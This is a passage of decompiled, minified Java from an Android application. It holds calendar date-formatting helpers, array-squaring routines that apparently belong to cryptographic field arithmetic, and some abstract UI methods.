        calendarG.setTimeInMillis(l2.longValue());
        Calendar calendarG2 = h31.g(null);
        calendarG2.setTimeInMillis(l3.longValue());
        return calendarG.get(1) == calendarG2.get(1) ? calendarG.get(1) == calendarF.get(1) ? new fk0(E(l2.longValue(), Locale.getDefault()), E(l3.longValue(), Locale.getDefault())) : new fk0(E(l2.longValue(), Locale.getDefault()), K(l3.longValue(), Locale.getDefault())) : new fk0(K(l2.longValue(), Locale.getDefault()), K(l3.longValue(), Locale.getDefault()));
    }

    public static void w0(int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[14];
        s90.Y(iArr, iArr3);
        k0(iArr3, iArr2);
    }

    public static String x(long j2) {
        Calendar calendarF = h31.f();
        Calendar calendarG = h31.g(null);
        calendarG.setTimeInMillis(j2);
        return calendarF.get(1) == calendarG.get(1) ? E(j2, Locale.getDefault()) : K(j2, Locale.getDefault());
    }

    public static void x0(int i2, int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[16];
        fa0.y0(iArr, iArr3);
        while (true) {
            g0(iArr3, iArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                fa0.y0(iArr2, iArr3);
            }
        }
    }

    public static yq y(em0 em0Var, kr krVar) {
        if (!(krVar instanceof hr)) {
            return new yq(krVar.a, krVar.c, krVar.d, krVar.e, krVar.b);
        }
        hr hrVar = (hr) krVar;
        return new jr(G(hrVar.f), hrVar.a, hrVar.c, hrVar.d, hrVar.e, hrVar.b);
    }

    public static void y0(int i2, long[] jArr, long[] jArr2) {
        long[] jArr3 = new long[5];
        N(jArr, jArr3);
        while (true) {
            h0(jArr3, jArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                N(jArr2, jArr3);
            }
        }
    }

    public static Drawable z(Context context, int i2) {
        return uo0.b().c(context, i2);
    }

    public static void z0(int i2, int[] iArr, int[] iArr2) {
        int[] iArr3 = new int[16];
        fa0.y0(iArr, iArr3);
        while (true) {
            i0(iArr3, iArr2);
            i2--;
            if (i2 <= 0) {
                return;
            } else {
                fa0.y0(iArr2, iArr3);
            }
        }
    }

    public abstract InputFilter[] A(InputFilter[] inputFilterArr);

    public abstract TransformationMethod M0(TransformationMethod transformationMethod);

    public abstract boolean O();

    public abstract void q0(boolean z2);

    public abstract void r0(boolean z2);
}
